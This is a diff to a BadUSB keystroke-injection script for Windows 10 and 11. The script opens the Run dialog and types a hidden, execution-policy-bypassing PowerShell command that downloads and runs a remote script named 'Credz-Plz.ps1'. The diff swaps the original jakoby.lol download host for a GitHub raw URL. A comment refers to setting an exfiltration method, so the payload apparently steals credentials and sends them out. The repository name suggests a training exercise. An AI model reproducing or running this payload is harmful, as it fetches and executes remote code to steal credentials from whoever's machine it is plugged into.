@@ -10,7 +10,10 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/35k | iex
+REM     STRING powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/35k | iex
+
+STRING powershell -w h -ep bypass $dc='';$db='';irm https://raw.githubusercontent.com/demiandjrn/CyberWeek2024/main/Badusb/Credz-Plz.ps1 | iex
+
 ENTER
 
 REM     Fill in either variable or both to set your exfil method.
